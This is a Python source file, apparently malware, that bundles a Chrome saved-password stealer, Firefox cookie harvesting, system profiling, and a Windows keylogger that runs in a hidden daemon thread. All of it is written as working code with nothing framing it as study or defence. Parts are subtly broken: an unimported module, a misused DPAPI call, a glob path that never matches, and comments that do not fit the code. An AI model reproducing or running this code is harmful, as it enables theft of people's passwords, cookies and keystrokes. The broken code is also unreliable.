import os
import sys
import json
import base64
import sqlite3
import platform
import threading
import ctypes
from typing import Dict, List, Optional
from datetime import datetime
from pathlib import Path
import logging
import time

class NativeBrowserManager:
    def __init__(self):
        self.platform = platform.system().lower()
        
    def _get_chrome_path(self) -> str:
        """Get Chrome data path based on OS"""
        if self.platform == 'windows':
            return os.path.join(os.getenv('LOCALAPPDATA'),
                'Google\\Chrome\\User Data\\Default')
        elif self.platform == 'linux':
            return os.path.expanduser('~/.config/google-chrome/Default')
        return ''
        
    def _decrypt_windows(self, encrypted: bytes, key: bytes = None) -> str:
        """Decrypt using Windows DPAPI"""
        try:
            return ctypes.windll.crypt32.CryptUnprotectData(
                encrypted, None, None, None, None, 0, None
            )
        except:
            return None
            
    def _get_chrome_passwords(self) -> List[Dict]:
        """Get Chrome passwords using native methods"""
        try:
            path = os.path.join(self._get_chrome_path(), 'Login Data')
            if not os.path.exists(path):
                return []
                
            # Copy DB to temp file to avoid lock
            temp_path = os.path.join(os.getenv('TEMP'), 'chrome_pwd.db')
            shutil.copy2(path, temp_path)
            
            passwords = []
            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT origin_url, username_value, password_value 
                    FROM logins
                ''')
                
                for url, username, encrypted_pwd in cursor.fetchall():
                    if self.platform == 'windows':
                        pwd = self._decrypt_windows(encrypted_pwd)
                    else:
                        pwd = self._decrypt_linux(encrypted_pwd)
                        
                    if pwd:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': pwd
                        })
                        
                conn.close()
            finally:
                try:
                    os.remove(temp_path)
                except:
                    pass
                    
            return passwords
        except:
            return []
            
    def _decrypt_linux(self, encrypted: bytes) -> str:
        """Decrypt using Linux methods"""
        # TO DO: implement Linux decryption
        return None
        
    def _get_firefox_passwords(self) -> List[Dict]:
        """Get Firefox passwords using native methods"""
        try:
            path = os.path.expanduser('~/.mozilla/firefox/*.default-release/cookies.sqlite')
            if not os.path.exists(path):
                return []
                
            # Copy DB to temp file to avoid lock
            temp_path = os.path.join(os.getenv('TEMP'), 'firefox_pwd.db')
            shutil.copy2(path, temp_path)
            
            passwords = []
            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT host, name, value 
                    FROM moz_cookies
                ''')
                
                for host, name, value in cursor.fetchall():
                    passwords.append({
                        'host': host,
                        'name': name,
                        'value': value
                    })
                    
                conn.close()
            finally:
                try:
                    os.remove(temp_path)
                except:
                    pass
                    
            return passwords
        except:
            return []
            
class SystemCollector:
    def __init__(self):
        self.platform = platform.system().lower()
        
    def get_system_info(self) -> Dict:
        """Get system information using native APIs"""
        info = {
            'platform': platform.system(),
            'hostname': platform.node(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'home': os.path.expanduser('~')
        }
        
        # Windows-specific info
        if self.platform == 'windows':
            try:
                info.update(self._get_windows_info())
            except:
                pass
                
        # Linux-specific info
        elif self.platform == 'linux':
            try:
                info.update(self._get_linux_info())
            except:
                pass
                
        return info
        
    def _get_windows_info(self) -> Dict:
        """Get Windows-specific information"""
        info = {}
        try:
            # Get Windows product key
            key = ctypes.create_string_buffer(255)
            ctypes.windll.kernel32.GetWindowsDirectoryA(key, 255)
            info['windows_dir'] = key.value.decode()
            
            # Get system metrics
            info['screen_width'] = ctypes.windll.user32.GetSystemMetrics(0)
            info['screen_height'] = ctypes.windll.user32.GetSystemMetrics(1)
            
            # Get system power info
            class SYSTEM_POWER_STATUS(ctypes.Structure):
                _fields_ = [
                    ('ACLineStatus', ctypes.c_byte),
                    ('BatteryFlag', ctypes.c_byte),
                    ('BatteryLifePercent', ctypes.c_byte),
                    ('Reserved1', ctypes.c_byte),
                    ('BatteryLifeTime', ctypes.c_ulong),
                    ('BatteryFullLifeTime', ctypes.c_ulong)
                ]
                
            status = SYSTEM_POWER_STATUS()
            ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status))
            info['battery_percent'] = status.BatteryLifePercent
            
        except:
            pass
            
        return info
        
    def _get_linux_info(self) -> Dict:
        """Get Linux-specific information"""
        info = {}
        try:
            # Get distribution info
            with open('/etc/os-release') as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith('PRETTY_NAME='):
                        info['distro'] = line.split('=')[1].strip().strip('"')
                        break
                        
            # Get CPU info
            with open('/proc/cpuinfo') as f:
                info['cpu_info'] = f.read()
                
            # Get memory info
            with open('/proc/meminfo') as f:
                info['mem_info'] = f.read()
                
        except:
            pass
            
        return info
        
class Keylogger:
    def __init__(self):
        self.log = []
        self.active = False
        self.thread = None
        
    def start(self):
        """Start keylogger using native APIs"""
        if self.active:
            return
            
        self.active = True
        self.thread = threading.Thread(target=self._windows_keylogger if platform.system().lower() == 'windows' else self._linux_keylogger)
        self.thread.daemon = True
        self.thread.start()
        
    def stop(self) -> List[str]:
        """Stop keylogger and return captured keystrokes"""
        self.active = False
        if self.thread:
            self.thread.join()
        return self.log
        
    def _windows_keylogger(self):
        """Windows native keylogger"""
        user32 = ctypes.windll.user32
        
        while self.active:
            for i in range(1, 256):
                if user32.GetAsyncKeyState(i) & 0x1:
                    char = chr(i)
                    self.log.append(char)
            time.sleep(0.01)
            
    def _linux_keylogger(self):
        """Linux native keylogger"""
        # TO DO: implement Linux keylogger
        pass
        
class Collector:
    def __init__(self):
        self.browser = NativeBrowserManager()
        self.system = SystemCollector()
        self.keylogger = Keylogger()
        
    def collect_all(self) -> Dict:
        """Collect all available data"""
        return {
            'timestamp': datetime.now().isoformat(),
            'system_info': self.system.get_system_info(),
            'chrome_passwords': self.browser._get_chrome_passwords(),
            'firefox_passwords': self.browser._get_firefox_passwords()
        }
        
    def start_keylogger(self):
        """Start keylogging"""
        self.keylogger.start()
        
    def stop_keylogger(self) -> List[str]:
        """Stop keylogging and get results"""
        return self.keylogger.stop()
